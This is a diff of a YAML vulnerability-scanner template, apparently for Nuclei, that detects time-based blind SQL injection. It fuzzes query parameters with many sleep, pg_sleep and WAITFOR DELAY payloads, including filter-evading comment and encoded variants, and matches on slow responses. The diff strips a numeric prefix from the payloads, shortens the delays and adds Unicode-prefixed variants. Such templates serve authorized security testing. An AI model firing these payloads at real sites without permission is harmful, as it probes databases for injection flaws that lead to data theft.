@@ -1,10 +1,9 @@
 id: oscuridad-sql
-
 info:
   name: Blind SQL Injection time based detection of sql backend
-  author: oscuridad
+  author: oscuridad1010
   severity: High
-  tags: sql,bsql
+  tags: sql1,bsql
 
 requests:
   - method: GET
@@ -12,55 +11,64 @@ requests:
       - "{{BaseURL}}"
     payloads:
       sqloscuridad:
-        - "1337 XOR(if(now()=sysdate(),sleep(7),0))XOR%23"
-        - "1337' or sleep(7)-- -#"
-        - "1337' or sleep(7)#"
-        - "1337' or sleep(7)='#"
-        - "1337' or sleep(7)='--"
-        - "1337'/*F*/or/*F*/sleep(7)='"
-        - "1337' or sleep(7)-- -%23"
-        - "1337' or sleep(7)%23"
-        - "1337' or sleep(7);%00"
-        - "1337 or sleep(7)--+-"
-        - "1337 or sleep(7)#"
-        - "1337'/*f*/or/*f*/sleep/*f*/(7)-- -#"
-        - "1337'/*f*/or/*f*/sleep/*f*/(7)#"
-        - "1337 or sleep(7)%23"
-        - "1337'/*f*/or/*f*/sleep/*f*/(7)-- -%23"
-        - "1337'/*f*/or/*f*/sleep/*f*/(7)%23"
-        - "1337'/*f*/or/*f*/sleep/*f*/(7);%00"
-        - "1337 or/*f*/sleep/*f*/(7)--+-"
-        - "1337 or/*f*/sleep/*f*/(7)#"
-        - "1337'XOR(if(now()=sysdate(),sleep(7),0))XOR'"
-        - "1337'OR(if(now()=sysdate(),sleep(7),0))-- -#"
-        - "1337'OR(if(now()=sysdate(),sleep(7),0))#"
-        - "1337 or/*f*/sleep/*f*/(7)%23"
-        - "1337'OR(if(now()=sysdate(),sleep(7),0))-- -%23"
-        - "1337'OR(if(now()=sysdate(),sleep(7),0))%23"
-        - "1337'OR(if(now()=sysdate(),sleep(7),0));%00"
-        - "1337 OR(if(now()=sysdate(),sleep(7),0))--+-"
-        - "1337 OR(if(now()=sysdate(),sleep(7),0))#"
-        - "1337 OR(if(now()=sysdate(),sleep(7),0))%23"
-        - "1337'WAITFOR DELAY '0:0:7';%00"
-        - "1337'WAITFOR DELAY '0:0:7'#"
-        - "1337'WAITFOR DELAY '0:0:7'%23"
-        - "1337'WAITFOR DELAY '0:0:7';%00"
-        - "1337 WAITFOR DELAY '0:0:7'#"
-        - "1337 WAITFOR DELAY '0:0:7'%23"
-        - "1337 WAITFOR DELAY '0:0:7'--+-"
-        - "1337'WAITFOR DELAY '0:0:7'--+-"
-        - "1337'WAITFOR DELAY '0:0:7'='"
-        - "1337\"/*F*/or/*f*/sleep(1)%23"
-        - "1337'/*f*/OR/*f*/pg_sleep(7)#"
-        - "1337'/*f*/OR/*f*/pg_sleep(7)%23"
-        - "1337'/*f*/OR/*f*/pg_sleep(7);%00"
-        - "1337 /*f*/OR/*f*/pg_sleep(10)--+-"
-        - "1337 /*f*/OR/*f*/pg_sleep(10)#"
-        - "1337 /*f*/OR/*f*/pg_sleep(10)%23"
-        - "1337'/*f*/OR/*f*/pg_sleep(7)=';%00"
-        - "1337\")/*F*/or/*f*/sleep(7)%23"
-        - "1337\")/*F*/or/*f*/sleep(7)%23"
-        
+        - " XOR(if(now()=sysdate(),sleep(1),0))XOR%23"
+        - "' or sleep(1)-- -#"
+        - "' or sleep(1)#"
+        - "' or sleep(1)='#"
+        - "' or sleep(1)='--"
+        - "'/*F*/or/*F*/sleep(1)='"
+        - "' or sleep(1)-- -%23"
+        - "' or sleep(1)%23"
+        - "' or sleep(1);%00"
+        - " or sleep(1)--+-"
+        - " or sleep(1)#"
+        - "'/*f*/or/*f*/sleep/*f*/(1)-- -#"
+        - "'/*f*/or/*f*/sleep/*f*/(1)#"
+        - " or sleep(1)%23"
+        - "'/*f*/or/*f*/sleep/*f*/(1)-- -%23"
+        - "'/*f*/or/*f*/sleep/*f*/(1)%23"
+        - "'/*f*/or/*f*/sleep/*f*/(1);%00"
+        - " or/*f*/sleep/*f*/(1)--+-"
+        - " or/*f*/sleep/*f*/(1)#"
+        - "'XOR(if(now()=sysdate(),sleep(1),0))XOR'"
+        - "'OR(if(now()=sysdate(),sleep(1),0))-- -#"
+        - "'OR(if(now()=sysdate(),sleep(1),0))#"
+        - " or/*f*/sleep/*f*/(1)%23"
+        - "'OR(if(now()=sysdate(),sleep(1),0))-- -%23"
+        - "'OR(if(now()=sysdate(),sleep(1),0))%23"
+        - "'OR(if(now()=sysdate(),sleep(1),0));%00"
+        - " OR(if(now()=sysdate(),sleep(1),0))--+-"
+        - " OR(if(now()=sysdate(),sleep(1),0))#"
+        - " OR(if(now()=sysdate(),sleep(1),0))%23"
+        - "'WAITFOR DELAY '0:0:10';%00"
+        - "'WAITFOR DELAY '0:0:10'#"
+        - "'WAITFOR DELAY '0:0:10'%23"
+        - "'WAITFOR DELAY '0:0:10';%00"
+        - " WAITFOR DELAY '0:0:10'#"
+        - " WAITFOR DELAY '0:0:10'%23"
+        - " WAITFOR DELAY '0:0:10'--+-"
+        - "'WAITFOR DELAY '0:0:10'--+-"
+        - "'WAITFOR DELAY '0:0:10'='"
+        - "\"/*F*/or/*f*/sleep(1)%23"
+        - "'/*f*/OR/*f*/pg_sleep(1)#"
+        - "'/*f*/OR/*f*/pg_sleep(1)%23"
+        - "'/*f*/OR/*f*/pg_sleep(1);%00"
+        - " /*f*/OR/*f*/pg_sleep(10)--+-"
+        - " /*f*/OR/*f*/pg_sleep(10)#"
+        - " /*f*/OR/*f*/pg_sleep(10)%23"
+        - "'/*f*/OR/*f*/pg_sleep(1)=';%00"
+        - "\")/*F*/or/*f*/sleep(1)%23"
+        - "\")/*F*/or/*f*/sleep(1)%23"
+        - "%E2%84%A2%21/*F*/or/*f*/sleep(1)%23"
+        - "%E2%84%A2%21/*F*/or/*f*/pg_sleep(1)%23"
+        - "%E2%84%A2%22/*F*/or/*f*/pg_sleep(1)%23"
+        - "%E2%84%A2%22/*F*/or/*f*/sleep(1)%23"
+        - "%E2%84%A2%22/*F*/or/*f*/sleep(1)--+-"
+        - "%E2%84%A2\")/*F*/or/*f*/sleep(1)--+-"
+        - "%E2%84%A2%21)/*F*/or/*f*/sleep(1)--+-"
+        - "%E2%84%A2'/*F*/or/*f*/sleep(1)='"
+        - "%E2%84%A2')/*F*/or/*f*/sleep(1)='"
+
     stop-at-first-match: true
     fuzzing:
       - part: query
@@ -72,5 +80,8 @@ requests:
     matchers:
       - type: dsl
         name: BlindSQLi
-        dsl: 
-          - 'duration >= 5'
+        dsl:
+          - 'duration>=5'
+
+    
+
